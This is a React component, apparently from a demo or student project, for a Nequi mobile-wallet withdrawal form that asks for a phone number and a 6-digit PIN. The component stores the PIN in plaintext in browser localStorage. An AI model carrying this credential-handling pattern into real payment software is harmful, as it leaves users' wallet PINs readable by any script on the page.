import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useNequi, validarNumeroTelefono } from "../logica/useNequi";

const Nequi = () => {
  const navigate = useNavigate();
  const [datos, setDatos] = useState({
    numeroIngresado: "",
    claveIngresada: "",
  });

  const continuarARetiro = () => {
    localStorage.setItem(
      "datosNequi",
      JSON.stringify({
        numeroIngresado: datos.numeroIngresado,
        claveIngresada: datos.claveIngresada,
      })
    );
    navigate("/retiro");
  };

  return (
    <div
      className="d-flex justify-content-center align-items-center"
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #f0f9ff, #e0f7fa)",
        padding: "20px",
      }}
    >
      <div className="card shadow-lg p-4 col-12 col-md-6 rounded-4">
        <h2 className="text-center mb-4 text-primary">📱 Retiro por NEQUI</h2>

        <div className="mb-3">
          <label className="form-label fw-bold">
            Número de celular (10 dígitos):
          </label>
          <input
            type="text"
            className="form-control"
            value={datos.numeroIngresado}
            onChange={(e) =>
              setDatos((d) => ({
                ...d,
                numeroIngresado: e.target.value
                  .replace(/[^0-9]/g, "")
                  .slice(0, 10),
              }))
            }
            placeholder="3001234567"
            maxLength="10"
          />
          {datos.numeroIngresado.length === 10 && (
            validarNumeroTelefono(datos.numeroIngresado) ? (
              <small className="text-success">✅ Número válido</small>
            ) : (
              <small className="text-danger">❌ Número inválido</small>
            )
          )}
        </div>

        <div className="mb-4">
          <label className="form-label fw-bold">
            Clave Nequi (6 dígitos):
          </label>
          <input
            type="password"
            className="form-control"
            value={datos.claveIngresada}
            onChange={(e) =>
              setDatos((d) => ({
                ...d,
                claveIngresada: e.target.value
                  .replace(/[^0-9]/g, "")
                  .slice(0, 6),
              }))
            }
            placeholder="••••••"
            maxLength="6"
          />
        </div>

        <div className="d-flex gap-3">
          <button className="btn btn-danger flex-fill" onClick={() => navigate("/")}>
            Volver
          </button>
          <button
            className="btn btn-success flex-fill"
            onClick={continuarARetiro}
            disabled={
              !validarNumeroTelefono(datos.numeroIngresado) ||
              datos.claveIngresada.length !== 6
            }
          >
            Continuar
          </button>
        </div>
      </div>
    </div>
  );
};

export default Nequi;

